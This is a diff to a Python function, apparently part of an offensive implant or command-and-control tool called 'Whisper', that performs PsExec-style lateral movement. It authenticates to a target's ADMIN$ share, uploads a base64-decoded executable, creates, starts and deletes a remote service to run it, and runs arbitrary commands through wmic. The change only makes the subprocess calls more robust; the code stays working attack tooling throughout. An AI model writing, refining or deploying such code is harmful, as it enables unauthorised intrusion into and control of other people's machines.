@@ -9,20 +9,22 @@ def _cmd_psexec(m):
     r = []
     try:
         if u and p:
-            subprocess.run(f'net use \\\\{t}\\ADMIN$ {p} /user:{u}', shell=True, capture_output=True, timeout=10)
+            unc_path = f"\\\\{t}\\ADMIN$"
+            subprocess.run(["net", "use", unc_path, p, "/user:" + u], capture_output=True, timeout=10)
             r.append("auth")
         tmp = "%TEMP%\\whisper_psexec.exe"
         if m.get("upload"):
             with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
                 f.write(base64.b64decode(m["upload"]))
                 local = f.name
-            subprocess.run(f'copy "{local}" \\\\{t}\\ADMIN${tmp}', shell=True, capture_output=True, timeout=15)
+            subprocess.run(["cmd.exe", "/c", "copy", local, f"\\\\{t}\\ADMIN${tmp}"], capture_output=True, timeout=15)
             os.remove(local)
             r.append("copied")
-        subprocess.run(f'sc \\\\{t} create Whisper_PSEXEC binPath= "{tmp}" start= demand', shell=True, capture_output=True, timeout=10)
-        subprocess.run(f'sc \\\\{t} start Whisper_PSEXEC', shell=True, capture_output=True, timeout=15)
-        subprocess.run(f'sc \\\\{t} delete Whisper_PSEXEC', shell=True, capture_output=True, timeout=10)
-        out = subprocess.run(f'wmic /node:{t} process call create "cmd /c {c} > %TEMP%\\whisper_out.txt 2>&1"', shell=True, capture_output=True, timeout=30, text=True)
+        remote_svc = f"\\\\{t}"
+        subprocess.run(["sc", remote_svc, "create", "Whisper_PSEXEC", f"binPath={tmp}", "start=demand"], capture_output=True, timeout=10)
+        subprocess.run(["sc", remote_svc, "start", "Whisper_PSEXEC"], capture_output=True, timeout=15)
+        subprocess.run(["sc", remote_svc, "delete", "Whisper_PSEXEC"], capture_output=True, timeout=10)
+        subprocess.run(["wmic", f"/node:{t}", "process", "call", "create", f"cmd /c {c} > %TEMP%\\whisper_out.txt 2>&1"], capture_output=True, timeout=30, text=True)
         r.append("done")
     except Exception as e: r.append(f"error: {e}")
     return {"output": f"[+] PsExec: {', '.join(r)}"}
